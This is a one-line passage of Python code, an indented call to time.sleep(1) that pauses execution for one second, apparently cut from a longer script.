        time.sleep(1)